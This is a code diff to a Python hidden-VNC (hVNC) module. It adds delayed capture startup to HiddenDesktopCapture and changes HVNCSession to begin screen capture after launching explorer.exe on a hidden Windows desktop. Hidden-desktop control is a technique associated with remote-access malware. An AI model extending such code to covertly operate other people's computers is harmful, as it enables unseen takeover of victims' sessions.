@@ -585,6 +585,7 @@ class HiddenDesktopCapture:
         width: int = 1920,
         height: int = 1080,
         fps: int = 30,
+        delay_start: bool = False,
     ):
         """Initialize capture for hidden desktop.
         
@@ -593,6 +594,7 @@ class HiddenDesktopCapture:
             width: Capture width
             height: Capture height
             fps: Target framerate
+            delay_start: If True, don't start capture thread immediately
         """
         self._desktop = desktop
         self._width = width
@@ -606,6 +608,17 @@ class HiddenDesktopCapture:
         self._frame: bytes | None = None
         self._frame_size = (width, height)
         self._initialized = threading.Event()
+        self._capture_thread = None
+        
+        if not delay_start:
+            self.start_capture()
+        
+        logger.info("Started hidden desktop capture: %dx%d @ %d fps", width, height, fps)
+    
+    def start_capture(self) -> bool:
+        """Start the capture thread."""
+        if self._capture_thread is not None and self._capture_thread.is_alive():
+            return True
         
         # Capture thread - will STAY on hidden desktop
         self._capture_thread = threading.Thread(target=self._capture_loop, daemon=True)
@@ -614,8 +627,8 @@ class HiddenDesktopCapture:
         # Wait for thread to initialize on hidden desktop
         if not self._initialized.wait(timeout=5.0):
             logger.error("Capture thread failed to initialize")
-        
-        logger.info("Started hidden desktop capture: %dx%d @ %d fps", width, height, fps)
+            return False
+        return True
     
     @property
     def frame_size(self) -> tuple[int, int]:
@@ -836,7 +849,7 @@ class HiddenDesktopCapture:
     def close(self) -> None:
         """Stop capture and cleanup."""
         self._stop_event.set()
-        if self._capture_thread.is_alive():
+        if self._capture_thread is not None and self._capture_thread.is_alive():
             self._capture_thread.join(timeout=2.0)
 
 
@@ -1088,6 +1101,7 @@ class HVNCSession:
         height: int = 1080,
         fps: int = 30,
         desktop_name: str | None = None,
+        auto_start_shell: bool = False,
     ):
         """Create hVNC session.
         
@@ -1096,6 +1110,7 @@ class HVNCSession:
             height: Screen capture height
             fps: Target framerate
             desktop_name: Custom desktop name (auto-generated if None)
+            auto_start_shell: If True, start shell before capture
         """
         self._width = width
         self._height = height
@@ -1104,12 +1119,13 @@ class HVNCSession:
         # Create hidden desktop
         self._desktop = HiddenDesktop(name=desktop_name)
         
-        # Create capture
+        # Create capture with delayed start - we'll start after shell is ready
         self._capture = HiddenDesktopCapture(
             self._desktop,
             width=width,
             height=height,
             fps=fps,
+            delay_start=True,  # Don't start capture yet
         )
         
         # Create input controller
@@ -1138,8 +1154,15 @@ class HVNCSession:
         return self._capture.frame_size
     
     def start_shell(self) -> bool:
-        """Start Windows shell (explorer.exe) on hidden desktop."""
-        return self._desktop.start_shell()
+        """Start Windows shell (explorer.exe) on hidden desktop and begin capture."""
+        result = self._desktop.start_shell()
+        if result:
+            # Wait for shell to fully initialize before starting capture
+            time.sleep(1.0)
+            # Now start capture - desktop should have content
+            self._capture.start_capture()
+            logger.info("Shell started and capture initialized")
+        return result
     
     def launch_application(
         self,
